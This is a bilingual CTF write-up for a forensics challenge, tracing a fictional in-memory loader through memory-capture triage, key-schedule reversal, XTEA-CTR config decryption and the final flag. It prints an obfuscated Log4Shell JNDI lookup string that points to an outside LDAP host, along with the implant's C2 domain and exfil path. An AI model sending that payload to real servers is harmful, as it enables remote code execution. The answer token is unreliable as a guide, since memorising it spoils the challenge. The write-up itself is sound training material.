<a id="en"></a>
**English** · [Русский](#ru)

# BurhanGuild Loader Incident

**Compfest CTF — Forensics / Incident Response — 100 pts**

> An internal Linux gateway was isolated after conflicting telemetry was reported.
> The live-response package contains volatile captures and remnants recovered from
> deleted storage. Review the collection as an incident responder, determine which
> evidence belongs to the same event, and submit the final incident proof token.

`nc <host> 7010`

---

## TL;DR

The package ships **five volatile captures** and **eight deleted-storage pages**, but
they don't all describe the same incident — most of them are decoys with mismatched
telemetry. Only **`capture_A812.raw`** is internally consistent (hidden loader +
`memfd:libpam_bg.so` + live C2 + deleted `/dev/shm/.bg-cache` archive), and it pairs
with the deleted page that carries the **same `evidence_ref`** and the right host.

From that one capture you:

1. carve the loader `.so` (BGMR record type 9),
2. reverse its key schedule (a custom sponge KDF + **XTEA-32 in CTR mode**),
3. decrypt the embedded `CFG3` config (self-verifies via its own `crc32`),
4. assemble the proof token exactly the way the config's `closure_contract` describes.

Final token:

```
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

---

## The package

```
BurhanGuild-Loader-Incident/
├── artifacts/
│   ├── integrity_manifest.json     # sha256 of every capture + page
│   ├── captures/                   # capture_{2C91,7F3A,91BE,A812,D044}.raw  (6 MB each)
│   └── deleted_pages/              # page_00.bin .. page_07.bin              (400 KB each)
├── plugins/
│   └── bgloader_hunt.py            # the "inspection helper" (BGMR v3 parser)
└── yara/
    └── burhanguild_memory_rules.yar
```

First thing — every file matches the manifest, so nothing is tampered:

```python
import json, hashlib, pathlib
m = json.load(open("artifacts/integrity_manifest.json"))
for grp, d in (("captures","artifacts/captures"), ("deleted_pages","artifacts/deleted_pages")):
    for name, h in m[grp].items():
        got = hashlib.sha256(pathlib.Path(d, name).read_bytes()).hexdigest()
        print(grp, name, "OK" if got == h else "MISMATCH")
# -> all OK
```

The README says *"the inspection helper documents its available capture views through
`--help`"*. `bgloader_hunt.py` parses a custom **BGMR v3** container and exposes views:

```
metadata processes environment heap maps network files supply carve-region
```

Each capture is a bag of length-prefixed records (`BGMR` magic, `version=3`, a `kind`
byte, and a big-endian size). The record *kinds* map onto those views:

| kind | view          | kind | view          |
|------|---------------|------|---------------|
| 1    | metadata      | 7    | files         |
| 2    | processes     | 9    | (carve-region)|
| 3    | environment   | 10   | supply        |
| 4    | heap          | —    |               |
| 5    | maps          | —    |               |
| 6    | network       | —    |               |

## Step 1 — which capture is the *real* event?

The whole point of the challenge is triage. Dump every view for every capture and
line them up:

```bash
for f in artifacts/captures/*.raw; do
  echo "### $f"
  for v in metadata processes environment network files maps heap supply; do
    python3 plugins/bgloader_hunt.py -f "$f" $v
  done
done
```

All five share the same skeleton — `systemd` → `java` (the gateway JRE) → `pkexec` —
but only some go further. Comparing them:

| capture | hidden `kworker` loader | map                              | network                              | deleted `.bg-cache` |
|---------|-------------------------|----------------------------------|--------------------------------------|---------------------|
| 2C91    | 4462                    | `rwxp memfd:libpam_bg.so`        | only loopback `127.0.0.1` (CLOSED)   | — (only `collector.chunk`) |
| 7F3A    | —                       | `r-xp memfd:libmetrics.so`       | loopback only                        | — |
| 91BE    | 4512                    | `r-xp memfd:libmetrics.so`       | loopback only                        | deleted zip, but host = *staging-node* |
| **A812**| **4787**                | **`rwxp memfd:libpam_bg.so`**    | **ESTABLISHED → `morrow-gate.wreckit.invalid:8443`** | **deleted `/dev/shm/.bg-cache/e0bafe9e.zip`** |
| D044    | —                       | `r-xp memfd:libmetrics.so`       | ESTABLISHED → `mirror-36.invalid`    | — |

The YARA rule tells you what the loader looks like:

```
rule BurhanGuild_Memory_Loader {
    strings:
        $elf   = { 7f 45 4c 46 02 01 01 }
        $cfg   = "CFG3"
        $memfd = "memfd:libpam_bg.so"
    condition:
        2 of them
}
```

`libpam_bg.so` (not `libmetrics.so`) + writable-executable mapping + a live external
C2 + a freshly-deleted `.bg-cache` archive **only all line up in `capture_A812.raw`**.
The others are near-misses: read-only maps, a decoy `libmetrics.so`, loopback-only
sockets, or a process that shows up in the environment table but not the process scan.
`A812` is our event.

Everything we need is in that one capture:

```
BG_MUTEX     = bguild-ce104cb0                 # environment, pid 4787
heap nonce   = a01fb1f61e9116a6                # 8-byte heap fragment @ 0x55550000e000
build id     = 542715c2e46252e4d790           # maps record (type 5)
loader pid   = 4787                            # hidden [kworker/u8:7]
jndi payload = ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}
```

(that heap blob is a de-obfuscated **Log4Shell** payload — the initial access vector.)

## Step 2 — pair it with the deleted page

Four of the eight pages carry a small recovered ZIP (`case_fragment.json` +
`transfer.log`). Carve them and read the metadata:

```python
import re, zipfile, io
for p in sorted(glob.glob("artifacts/deleted_pages/*.bin")):
    raw = open(p, "rb").read()
    s = raw.find(b"PK\x03\x04"); e = raw.find(b"PK\x05\x06", s)
    if s < 0: continue
    z = zipfile.ZipFile(io.BytesIO(raw[s:e+22]))
    print(p, z.read("case_fragment.json"))
```

```
page_01 -> host=staging-node   ref=EV-6349D70995EF
page_03 -> host=staging-node   ref=EV-53A096352133
page_05 -> host=orion-lab      ref=EV-B1DC93988DBC   <-- matches A812's deleted handle
page_07 -> host=staging-node   ref=EV-649FB7391E41
```

`A812`'s deleted file handle referenced `evidence_ref = EV-B1DC93988DBC`, and only
**`page_05.bin`** has that ref **and** host `orion-lab` (the manifest host). The other
three are `staging-node` noise. That recovered ZIP is the exfil archive:

```
archive_sha256 = 4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a
```

## Step 3 — carve the loader

Record type 9 is the loader image; `carve-region` writes it out:

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw carve-region -o loader.so
# wrote loader.so size=13904 sha256=1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223
file loader.so   # ELF 64-bit LSB shared object, x86-64, stripped
```

The interesting bits live in `.rodata`: a **`CFG3`** blob (4-byte magic, 4-byte length,
then ciphertext) and the marker string `eir-v3`.

## Step 4 — reverse the crypto

`objdump` refuses (`can't disassemble for architecture UNKNOWN` on the carved region),
so disassemble the `.text` with capstone. Two routines matter.

**Key schedule** (`0x1100`): a little sponge over four inputs, seeded with the digits of
π (`0x243f6a88 0x85a308d3 0x13198a2e 0x03707344`) and stepped with the golden-ratio
constant `0x9e3779b9`. It mixes the input bytes into a 128-bit state and byteswaps out
a 16-byte key.

**Block function** (`0x13e0`): 32 rounds, delta `0x9e3779b9`, sum reaching
`0xC6EF3720` — textbook **XTEA**. It's used in **CTR mode**: the nonce is the first 4
bytes of the heap fragment, the counter is a single incrementing byte, and each
keystream block is XORed into the ciphertext.

The four KDF inputs (concatenated) are, in order:

```
BG_MUTEX  ("bguild-ce104cb0")  +  heap8 (a01fb1f61e9116a6)  +  build_id (10 bytes)  +  "eir-v3"
```

Decrypting the `CFG3` blob yields JSON, and it self-checks: the plaintext contains a
`crc32` field equal to the CRC32 of the plaintext-minus-that-field — so you *know* the
key is right:

```json
{
  "c2_domain": "morrow-gate.wreckit.invalid",
  "c2_port": 8443,
  "campaign": "side-door-crown",
  "implant_id": "BG-94C2A04EC6",
  "exfil_path": "/api/v3/guild/sync",
  "magic": "BGCF",
  "sleep_jitter": 37,
  "version": 3,
  "crc32": "b41d727b",
  "closure_contract": {
    "digest_algorithm": "sha256",
    "digest_fields": ["jndi_normalized","build_id","implant_id","c2_domain","archive_sha256"],
    "digest_separator": "|",
    "token_schema": "BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}"
  }
}
```

## Step 5 — build the proof token

The config hands you the recipe. `digest` is sha256 over the pipe-joined fields, the
first of which is the **normalized** JNDI string (resolve every `${lower:x}` → `x`):

```
jndi_normalized = ${jndi:ldap://172.19.0.66:1389/BurhanGuild}

digest = sha256( jndi_normalized | build_id | implant_id | c2_domain | archive_sha256 )
       = sha256( "${jndi:ldap://172.19.0.66:1389/BurhanGuild}"
                 "|542715c2e46252e4d790"
                 "|BG-94C2A04EC6"
                 "|morrow-gate.wreckit.invalid"
                 "|4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a" )
       = 836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed

config_sha256 = sha256(decrypted CFG3 plaintext)
              = 360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b
```

Plug the fields into `token_schema`:

```
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

## Solver

[`scripts/solve.py`](scripts/solve.py) does the whole chain from the untouched
attachment — triage, page matching, carve, KDF+XTEA decrypt, crc32 check, token
assembly:

```bash
python3 scripts/solve.py path/to/BurhanGuild-Loader-Incident
```

```
[+] genuine capture : capture_A812.raw
[+] loader pid      : 4787
[+] BG_MUTEX        : bguild-ce104cb0
[+] heap nonce/key  : a01fb1f61e9116a6
[+] build id        : 542715c2e46252e4d790
[+] jndi payload    : ${jndi:ldap://172.19.0.66:1389/BurhanGuild}
[+] matched page    : page_05.bin  (EV-B1DC93988DBC)
[+] archive sha256  : 4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a
[+] carved .so      : 13904 bytes  sha256=1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223
[+] CFG3 decrypted & crc32 verified
[FLAG] BGLPROOF{orion-lab__cap-A812__...__digest-836d4fce...}
```

## Notes / rabbit holes

- The `supply` view (xz/liblzma `CVE-2024-3094`) and the `collector.chunk` write
  handles are flavor — every capture has them, so they can't be the discriminator.
- `libmetrics.so` vs `libpam_bg.so` is the cleanest tell for a decoy capture.
- `config_sha256` is the sha256 of the **decrypted config bytes**; the `crc32` field
  inside the config is only there to confirm your key schedule is correct.

---

<a id="ru"></a>
[English](#en) · **Русский**

# BurhanGuild Loader Incident

**Compfest CTF — Форензика / Incident Response — 100 очков**

> Внутренний Linux-шлюз изолировали после того, как поступила противоречивая
> телеметрия. Пакет live-response содержит волатильные снимки памяти и остатки,
> восстановленные с удалённого хранилища. Разберись в собранном материале как
> incident responder, определи, какие улики относятся к одному и тому же событию,
> и сдай итоговый incident proof token.

`nc <host> 7010`

---

## Кратко (TL;DR)

В пакете **пять волатильных снимков** и **восемь страниц удалённого хранилища**, но
описывают они не одно событие — большинство это ложные следы с несостыкованной
телеметрией. Внутренне непротиворечив только **`capture_A812.raw`** (скрытый загрузчик +
`memfd:libpam_bg.so` + живой C2 + удалённый архив `/dev/shm/.bg-cache`), и он спарен с
той удалённой страницей, у которой **тот же `evidence_ref`** и правильный хост.

Из этого одного снимка нужно:

1. вырезать загрузчик `.so` (запись BGMR типа 9),
2. реверснуть его формирование ключа (кастомный «губчатый» KDF + **XTEA-32 в режиме CTR**),
3. расшифровать встроенный конфиг `CFG3` (он сам себя проверяет через поле `crc32`),
4. собрать proof token ровно так, как описывает `closure_contract` из конфига.

Итоговый токен:

```
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

---

## Пакет

```
BurhanGuild-Loader-Incident/
├── artifacts/
│   ├── integrity_manifest.json     # sha256 каждого снимка и страницы
│   ├── captures/                   # capture_{2C91,7F3A,91BE,A812,D044}.raw  (по 6 МБ)
│   └── deleted_pages/              # page_00.bin .. page_07.bin              (по 400 КБ)
├── plugins/
│   └── bgloader_hunt.py            # «inspection helper» (парсер BGMR v3)
└── yara/
    └── burhanguild_memory_rules.yar
```

Первым делом — всё сходится с манифестом, значит ничего не подменено:

```python
import json, hashlib, pathlib
m = json.load(open("artifacts/integrity_manifest.json"))
for grp, d in (("captures","artifacts/captures"), ("deleted_pages","artifacts/deleted_pages")):
    for name, h in m[grp].items():
        got = hashlib.sha256(pathlib.Path(d, name).read_bytes()).hexdigest()
        print(grp, name, "OK" if got == h else "MISMATCH")
# -> везде OK
```

В README challenge-а сказано: *«инструмент показывает доступные представления снимков
через `--help`»*. `bgloader_hunt.py` парсит кастомный контейнер **BGMR v3** и даёт
представления:

```
metadata processes environment heap maps network files supply carve-region
```

Каждый снимок — это набор записей с префиксом длины (`BGMR`, `version=3`, байт `kind`,
big-endian размер). Типы записей (`kind`) соответствуют представлениям:

| kind | представление | kind | представление |
|------|---------------|------|---------------|
| 1    | metadata      | 7    | files         |
| 2    | processes     | 9    | (carve-region)|
| 3    | environment   | 10   | supply        |
| 4    | heap          | —    |               |
| 5    | maps          | —    |               |
| 6    | network       | —    |               |

## Шаг 1 — какой снимок относится к *реальному* событию?

Весь смысл задания — в триаже. Выгружаем все представления по каждому снимку и
сравниваем:

```bash
for f in artifacts/captures/*.raw; do
  echo "### $f"
  for v in metadata processes environment network files maps heap supply; do
    python3 plugins/bgloader_hunt.py -f "$f" $v
  done
done
```

У всех пяти одинаковый костяк — `systemd` → `java` (JRE шлюза) → `pkexec` — но
дальше идут не все. Сравнение:

| снимок | скрытый загрузчик `kworker` | map                              | сеть                                   | удалённый `.bg-cache` |
|--------|-----------------------------|----------------------------------|----------------------------------------|-----------------------|
| 2C91   | 4462                        | `rwxp memfd:libpam_bg.so`        | только loopback `127.0.0.1` (CLOSED)   | — (только `collector.chunk`) |
| 7F3A   | —                           | `r-xp memfd:libmetrics.so`       | только loopback                        | — |
| 91BE   | 4512                        | `r-xp memfd:libmetrics.so`       | только loopback                        | удалённый zip, но хост = *staging-node* |
| **A812**| **4787**                   | **`rwxp memfd:libpam_bg.so`**    | **ESTABLISHED → `morrow-gate.wreckit.invalid:8443`** | **удалён `/dev/shm/.bg-cache/e0bafe9e.zip`** |
| D044   | —                           | `r-xp memfd:libmetrics.so`       | ESTABLISHED → `mirror-36.invalid`      | — |

YARA-правило подсказывает, как выглядит загрузчик:

```
rule BurhanGuild_Memory_Loader {
    strings:
        $elf   = { 7f 45 4c 46 02 01 01 }
        $cfg   = "CFG3"
        $memfd = "memfd:libpam_bg.so"
    condition:
        2 of them
}
```

`libpam_bg.so` (а не `libmetrics.so`) + writable-executable маппинг + живой внешний C2
+ только что удалённый архив `.bg-cache` — всё это сходится **только в `capture_A812.raw`**.
Остальные — почти-совпадения: read-only маппинги, подставной `libmetrics.so`,
loopback-only сокеты или процесс, который есть в таблице окружения, но не в скане
процессов. `A812` — наше событие.

Всё нужное — в этом одном снимке:

```
BG_MUTEX     = bguild-ce104cb0                 # environment, pid 4787
heap nonce   = a01fb1f61e9116a6                # 8-байтный фрагмент кучи @ 0x55550000e000
build id     = 542715c2e46252e4d790           # запись maps (тип 5)
loader pid   = 4787                            # скрытый [kworker/u8:7]
jndi payload = ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:1389/BurhanGuild}
```

(этот кусок кучи — деобфусцированный payload **Log4Shell**, вектор первичного доступа.)

## Шаг 2 — спарить снимок с удалённой страницей

Четыре из восьми страниц несут маленький восстановленный ZIP (`case_fragment.json` +
`transfer.log`). Вырезаем и читаем метаданные:

```python
import re, zipfile, io
for p in sorted(glob.glob("artifacts/deleted_pages/*.bin")):
    raw = open(p, "rb").read()
    s = raw.find(b"PK\x03\x04"); e = raw.find(b"PK\x05\x06", s)
    if s < 0: continue
    z = zipfile.ZipFile(io.BytesIO(raw[s:e+22]))
    print(p, z.read("case_fragment.json"))
```

```
page_01 -> host=staging-node   ref=EV-6349D70995EF
page_03 -> host=staging-node   ref=EV-53A096352133
page_05 -> host=orion-lab      ref=EV-B1DC93988DBC   <-- совпадает с удалённым хэндлом A812
page_07 -> host=staging-node   ref=EV-649FB7391E41
```

Удалённый файловый хэндл в `A812` ссылался на `evidence_ref = EV-B1DC93988DBC`, и только
**`page_05.bin`** имеет этот ref **и** хост `orion-lab` (хост из манифеста). Остальные три —
шум `staging-node`. Этот восстановленный ZIP и есть архив эксфильтрации:

```
archive_sha256 = 4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a
```

## Шаг 3 — вырезать загрузчик

Запись типа 9 — образ загрузчика; `carve-region` выгружает его:

```bash
python3 plugins/bgloader_hunt.py -f artifacts/captures/capture_A812.raw carve-region -o loader.so
# wrote loader.so size=13904 sha256=1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223
file loader.so   # ELF 64-bit LSB shared object, x86-64, stripped
```

Самое интересное лежит в `.rodata`: блоб **`CFG3`** (4 байта magic, 4 байта длина, дальше
шифртекст) и маркер `eir-v3`.

## Шаг 4 — реверс крипты

`objdump` отказывается (`can't disassemble for architecture UNKNOWN` на вырезанном
регионе), поэтому дизассемблируем `.text` через capstone. Важны две функции.

**Формирование ключа** (`0x1100`): небольшая «губка» по четырём входам, инициализируется
цифрами π (`0x243f6a88 0x85a308d3 0x13198a2e 0x03707344`) и продвигается константой
золотого сечения `0x9e3779b9`. Перемешивает входные байты в 128-битное состояние и
byteswap-ом выдаёт 16-байтный ключ.

**Блочная функция** (`0x13e0`): 32 раунда, delta `0x9e3779b9`, сумма доходит до
`0xC6EF3720` — классический **XTEA**. Используется в **режиме CTR**: nonce — первые 4
байта фрагмента кучи, счётчик — один инкрементируемый байт, каждый блок гаммы XOR-ится
с шифртекстом.

Четыре входа KDF (в порядке конкатенации):

```
BG_MUTEX  ("bguild-ce104cb0")  +  heap8 (a01fb1f61e9116a6)  +  build_id (10 байт)  +  "eir-v3"
```

Расшифровка блоба `CFG3` даёт JSON, и он сам себя проверяет: внутри есть поле `crc32`,
равное CRC32 от plaintext-а без этого поля — так что ты *знаешь*, что ключ верный:

```json
{
  "c2_domain": "morrow-gate.wreckit.invalid",
  "c2_port": 8443,
  "campaign": "side-door-crown",
  "implant_id": "BG-94C2A04EC6",
  "exfil_path": "/api/v3/guild/sync",
  "magic": "BGCF",
  "sleep_jitter": 37,
  "version": 3,
  "crc32": "b41d727b",
  "closure_contract": {
    "digest_algorithm": "sha256",
    "digest_fields": ["jndi_normalized","build_id","implant_id","c2_domain","archive_sha256"],
    "digest_separator": "|",
    "token_schema": "BGLPROOF{orion-lab__cap-{capture_id}__loader-{loader_pid}__implant-{implant_id}__build-{build_id}__config-{config_sha256}__archive-{archive_sha256}__digest-{digest}}"
  }
}
```

## Шаг 5 — собрать proof token

Конфиг сам выдаёт рецепт. `digest` — это sha256 от полей, склеенных через `|`, первое из
которых — **нормализованная** строка JNDI (раскрыть все `${lower:x}` → `x`):

```
jndi_normalized = ${jndi:ldap://172.19.0.66:1389/BurhanGuild}

digest = sha256( jndi_normalized | build_id | implant_id | c2_domain | archive_sha256 )
       = sha256( "${jndi:ldap://172.19.0.66:1389/BurhanGuild}"
                 "|542715c2e46252e4d790"
                 "|BG-94C2A04EC6"
                 "|morrow-gate.wreckit.invalid"
                 "|4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a" )
       = 836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed

config_sha256 = sha256(расшифрованный plaintext CFG3)
              = 360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b
```

Подставляем поля в `token_schema`:

```
BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
```

## Solver

[`scripts/solve.py`](scripts/solve.py) проходит всю цепочку из нетронутого вложения —
триаж, поиск парной страницы, carve, расшифровка KDF+XTEA, проверка crc32, сборка
токена:

```bash
python3 scripts/solve.py challenge/BurhanGuild-Loader-Incident
```

```
[+] genuine capture : capture_A812.raw
[+] loader pid      : 4787
[+] BG_MUTEX        : bguild-ce104cb0
[+] heap nonce/key  : a01fb1f61e9116a6
[+] build id        : 542715c2e46252e4d790
[+] jndi payload    : ${jndi:ldap://172.19.0.66:1389/BurhanGuild}
[+] matched page    : page_05.bin  (EV-B1DC93988DBC)
[+] archive sha256  : 4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a
[+] carved .so      : 13904 bytes  sha256=1858064aa10396aafa565583707a0084c21370868e26d93b63309133687be223
[+] CFG3 decrypted & crc32 verified
[FLAG] BGLPROOF{orion-lab__cap-A812__...__digest-836d4fce...}
```

## Заметки / тупики

- Представление `supply` (xz/liblzma `CVE-2024-3094`) и файловые хэндлы
  `collector.chunk` — это «мясо для антуража»: они есть у каждого снимка, различить по
  ним нельзя.
- `libmetrics.so` против `libpam_bg.so` — самый чистый признак подставного снимка.
- `config_sha256` — это sha256 **расшифрованных байтов конфига**; поле `crc32` внутри
  конфига нужно лишь чтобы подтвердить, что ключ подобран верно.
